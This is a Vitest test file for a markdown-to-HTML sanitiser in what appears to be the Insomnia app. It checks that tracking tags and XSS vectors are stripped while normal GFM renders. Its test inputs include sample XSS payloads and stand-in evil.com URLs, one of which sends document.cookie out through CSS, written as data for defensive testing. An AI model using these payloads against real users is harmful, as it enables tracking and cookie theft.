// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';

import { markdownToHTMLSafe } from '../markdown-to-html';

// ─── Helpers ─────────────────────────────────────────────────────────────────

/** Returns true if the sanitised output contains a given tag name in any form. */
const hasTag = (html: string, tag: string) => new RegExp(`<${tag}[\\s>/]`, 'i').test(html);

// ─── Remote-resource loading elements ────────────────────────────────────────
//
// These elements trigger network requests when rendered in Electron. A malicious
// README author could use them to fingerprint users or exfiltrate the Insomnia
// version. The allowlist approach (ALLOWED_TAGS) blocks ALL of them by default,
// including tags added to the HTML spec after the allowlist was written.

describe('markdownToHTMLSafe — blocks remote-resource-loading elements', () => {
  it('strips <img> even when inlined as raw HTML', () => {
    const output = markdownToHTMLSafe('<img src="https://evil.com/track.png" onerror="alert(1)">');
    expect(hasTag(output, 'img')).toBe(false);
    expect(output).not.toContain('evil.com');
  });

  it('strips markdown image syntax (![...](...)))', () => {
    const output = markdownToHTMLSafe('![tracking pixel](https://evil.com/t.png)');
    expect(hasTag(output, 'img')).toBe(false);
    expect(output).not.toContain('evil.com');
  });

  it('strips <video> — would trigger audio/video fetch', () => {
    const output = markdownToHTMLSafe('<video src="https://evil.com/track.mp4" autoplay></video>');
    expect(hasTag(output, 'video')).toBe(false);
    expect(output).not.toContain('evil.com');
  });

  it('strips <audio> — would trigger audio fetch', () => {
    const output = markdownToHTMLSafe('<audio src="https://evil.com/track.mp3" autoplay></audio>');
    expect(hasTag(output, 'audio')).toBe(false);
    expect(output).not.toContain('evil.com');
  });

  it('strips <picture> and nested <source> elements', () => {
    const input = `<picture>
      <source srcset="https://evil.com/hi-dpi.png" media="(min-width:600px)">
      <source srcset="https://evil.com/lo-dpi.png">
    </picture>`;
    const output = markdownToHTMLSafe(input);
    expect(hasTag(output, 'picture')).toBe(false);
    expect(hasTag(output, 'source')).toBe(false);
    expect(output).not.toContain('evil.com');
  });

  it('strips standalone <source> elements', () => {
    const output = markdownToHTMLSafe('<source src="https://evil.com/t.mp4" type="video/mp4">');
    expect(hasTag(output, 'source')).toBe(false);
  });

  it('strips SVG <image> elements — distinct from HTML <img>', () => {
    // SVG uses <image> (not <img>). FORBID_TAGS: ['img'] would NOT catch this;
    // the ALLOWED_TAGS allowlist correctly blocks it.
    const input = '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.com/t.svg"/></svg>';
    const output = markdownToHTMLSafe(input);
    expect(output).not.toContain('evil.com');
  });

  it('strips <iframe> elements', () => {
    const output = markdownToHTMLSafe('<iframe src="https://evil.com/frame" sandbox=""></iframe>');
    expect(hasTag(output, 'iframe')).toBe(false);
    expect(output).not.toContain('evil.com');
  });

  it('strips <embed> elements', () => {
    const output = markdownToHTMLSafe('<embed src="https://evil.com/plugin.swf" type="application/x-shockwave-flash">');
    expect(hasTag(output, 'embed')).toBe(false);
    expect(output).not.toContain('evil.com');
  });

  it('strips <object> elements', () => {
    const output = markdownToHTMLSafe('<object data="https://evil.com/thing" type="text/html"></object>');
    expect(hasTag(output, 'object')).toBe(false);
    expect(output).not.toContain('evil.com');
  });

  it('strips <link> elements (stylesheet, prefetch, etc.)', () => {
    const output = markdownToHTMLSafe('<link rel="stylesheet" href="https://evil.com/style.css">');
    expect(hasTag(output, 'link')).toBe(false);
    expect(output).not.toContain('evil.com');
  });
});

// ─── XSS vectors ─────────────────────────────────────────────────────────────

describe('markdownToHTMLSafe — blocks XSS vectors', () => {
  it('strips <script> tags and their contents', () => {
    const output = markdownToHTMLSafe('<script>alert("xss")</script>');
    expect(hasTag(output, 'script')).toBe(false);
    expect(output).not.toContain('alert(');
  });

  it('strips javascript: hrefs in markdown links', () => {
    const output = markdownToHTMLSafe('[click me](javascript:alert(1))');
    expect(output).not.toContain('javascript:');
  });

  it('strips javascript: hrefs in raw <a> tags', () => {
    const output = markdownToHTMLSafe('<a href="javascript:void(0)">link</a>');
    expect(output).not.toContain('javascript:');
  });

  it('strips data: URIs in hrefs — avoids inline HTML execution', () => {
    const output = markdownToHTMLSafe('<a href="data:text/html,<script>alert(1)</script>">click</a>');
    expect(output).not.toContain('data:');
  });

  it('strips inline event handlers (onclick)', () => {
    const output = markdownToHTMLSafe('<a href="https://example.com" onclick="alert(1)">link</a>');
    expect(output).not.toContain('onclick');
  });

  it('strips onerror handlers — common XSS via image errors', () => {
    const output = markdownToHTMLSafe('<p onerror="alert(1)">text</p>');
    expect(output).not.toContain('onerror');
  });

  it('strips onload handlers', () => {
    const output = markdownToHTMLSafe('<div onload="exfiltrate()">content</div>');
    expect(output).not.toContain('onload');
  });

  it('strips <style> tags — avoids CSS-based data exfiltration', () => {
    const output = markdownToHTMLSafe(
      '<style>body { background: url("https://evil.com/t.png?c="+document.cookie); }</style>',
    );
    expect(hasTag(output, 'style')).toBe(false);
    expect(output).not.toContain('evil.com');
  });

  it('strips style attributes — avoids CSS expression / url() attacks', () => {
    const output = markdownToHTMLSafe('<p style="background:url(https://evil.com/t.png)">text</p>');
    expect(output).not.toContain('style=');
    expect(output).not.toContain('evil.com');
  });

  it('strips unknown attributes from otherwise-allowed tags', () => {
    // 'id' is not in ALLOWED_ATTR — should be removed from every element
    const output = markdownToHTMLSafe('<p id="injected">text</p>');
    expect(output).not.toContain('id=');
  });
});

// ─── Valid GFM content is preserved ──────────────────────────────────────────

describe('markdownToHTMLSafe — preserves valid GFM output', () => {
  it('renders all heading levels h1–h6', () => {
    const input = '# H1\n## H2\n### H3\n#### H4\n##### H5\n###### H6';
    const output = markdownToHTMLSafe(input);
    for (const level of [1, 2, 3, 4, 5, 6]) {
      expect(hasTag(output, `h${level}`)).toBe(true);
    }
  });

  it('renders bold and italic emphasis', () => {
    const output = markdownToHTMLSafe('**bold** and *italic* and ~~strike~~');
    expect(hasTag(output, 'strong')).toBe(true);
    expect(hasTag(output, 'em')).toBe(true);
    expect(hasTag(output, 'del')).toBe(true);
  });

  it('renders unordered lists', () => {
    const output = markdownToHTMLSafe('- item one\n- item two\n- item three');
    expect(hasTag(output, 'ul')).toBe(true);
    expect(hasTag(output, 'li')).toBe(true);
    expect(output).toContain('item one');
  });

  it('renders ordered lists', () => {
    const output = markdownToHTMLSafe('1. first\n2. second\n3. third');
    expect(hasTag(output, 'ol')).toBe(true);
    expect(hasTag(output, 'li')).toBe(true);
  });

  it('renders inline code', () => {
    const output = markdownToHTMLSafe('Use `const x = 1` in your code');
    expect(hasTag(output, 'code')).toBe(true);
    expect(output).toContain('const x = 1');
  });

  it('renders fenced code blocks with <pre><code> and preserves class for highlight.js', () => {
    const output = markdownToHTMLSafe('```javascript\nconst x = 1;\n```');
    expect(hasTag(output, 'pre')).toBe(true);
    expect(hasTag(output, 'code')).toBe(true);
    // marked emits class="language-javascript"; highlight.js needs the class attribute
    expect(output).toContain('class=');
    expect(output).toContain('const x = 1');
  });

  it('renders blockquotes', () => {
    const output = markdownToHTMLSafe('> A wise person once said something\n');
    expect(hasTag(output, 'blockquote')).toBe(true);
    expect(output).toContain('wise person');
  });

  it('renders GFM tables', () => {
    const input = '| Name | Value |\n|------|-------|\n| foo  | bar   |';
    const output = markdownToHTMLSafe(input);
    expect(hasTag(output, 'table')).toBe(true);
    expect(hasTag(output, 'thead')).toBe(true);
    expect(hasTag(output, 'tbody')).toBe(true);
    expect(hasTag(output, 'th')).toBe(true);
    expect(hasTag(output, 'td')).toBe(true);
    expect(output).toContain('foo');
    expect(output).toContain('bar');
  });

  it('renders horizontal rules', () => {
    const output = markdownToHTMLSafe('\n---\n');
    expect(hasTag(output, 'hr')).toBe(true);
  });

  it('renders links and preserves href and title attributes', () => {
    const output = markdownToHTMLSafe('[OpenAI](https://openai.com "AI company")');
    expect(hasTag(output, 'a')).toBe(true);
    expect(output).toContain('href="https://openai.com"');
    expect(output).toContain('title="AI company"');
    expect(output).toContain('OpenAI');
  });

  it('strips non-allowlisted attributes from links (only href, title, class survive)', () => {
    const output = markdownToHTMLSafe(
      '<a href="https://example.com" id="x" rel="noopener" target="_blank">link</a>',
    );
    expect(output).toContain('href=');
    expect(output).not.toContain('id=');
    expect(output).not.toContain('rel=');
    expect(output).not.toContain('target=');
  });

  it('renders paragraphs with plain text — no auto-escaping needed from our side', () => {
    const output = markdownToHTMLSafe('Hello, world! This is a paragraph.');
    expect(hasTag(output, 'p')).toBe(true);
    expect(output).toContain('Hello, world!');
  });
});
